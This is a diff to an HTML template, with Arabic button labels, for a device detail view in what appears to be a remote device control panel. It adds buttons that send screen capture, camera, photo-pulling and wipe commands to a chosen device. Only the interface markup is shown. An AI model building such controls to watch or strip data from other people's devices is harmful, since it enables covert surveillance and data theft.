@@ -92,11 +92,13 @@
       <div class="actions">
         <button data-testid="detail-reconnect" @click="$store.panel.reconnect($store.panel.route.id)">إعادة ربط</button>
         <button data-testid="detail-delete" class="danger" @click="$store.panel.removeDevice($store.panel.route.id)">حذف</button>
-        <select data-testid="command-select" x-model="$store.panel.commandChoice">
-          <option value="ping">ping</option>
-          <option value="sync_config">sync_config</option>
-        </select>
-        <button data-testid="command-send" @click="$store.panel.sendCommand($store.panel.route.id)">ابعت</button>
+      </div>
+      <div class="actions">
+        <button data-testid="cmd-ping" @click="$store.panel.sendCommand($store.panel.route.id, 'ping')">ping</button>
+        <button data-testid="cmd-screen" @click="$store.panel.sendCommand($store.panel.route.id, 'screen_capture')">بث الشاشة</button>
+        <button data-testid="cmd-camera" @click="$store.panel.sendCommand($store.panel.route.id, 'camera')">كاميرا</button>
+        <button data-testid="cmd-photos" @click="$store.panel.sendCommand($store.panel.route.id, 'pull_photos')">سحب صور</button>
+        <button data-testid="cmd-wipe" class="danger" @click="$store.panel.sendCommand($store.panel.route.id, 'wipe')">فرمتة</button>
         <span data-testid="command-flash" x-show="$store.panel.flash" x-text="$store.panel.flash"></span>
       </div>
     </article>
